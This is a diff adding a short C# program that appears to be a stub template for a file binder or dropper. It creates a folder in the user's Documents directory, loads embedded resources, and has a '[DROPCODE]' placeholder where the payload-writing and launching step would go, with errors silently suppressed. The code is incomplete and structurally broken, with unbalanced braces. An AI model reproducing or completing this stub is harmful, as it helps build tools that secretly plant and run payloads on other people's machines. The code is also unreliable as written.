@@ -1,0 +1,27 @@
+﻿using System;
+using System.IO;
+using System.Resources;
+using System.Reflection;
+using System.Diagnostics;
+[assembly: AssemblyCopyright("Copyright ©  2017 ExFregion LLC")]
+
+namespace Binde
+{
+    static class Readandlaunch
+    {
+        static void Main()
+        {
+            try {
+                string malabar = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "//rec" ; // change the folderPath , it's a diskversion
+                if (!Directory.Exists(malabar))
+                {
+                 Directory.CreateDirectory(malabar);
+                }
+                    ResourceManager m = new ResourceManager("files", Assembly.GetExecutingAssembly());
+            [DROPCODE]
+    }
+            catch{}
+}
+}
+}
+
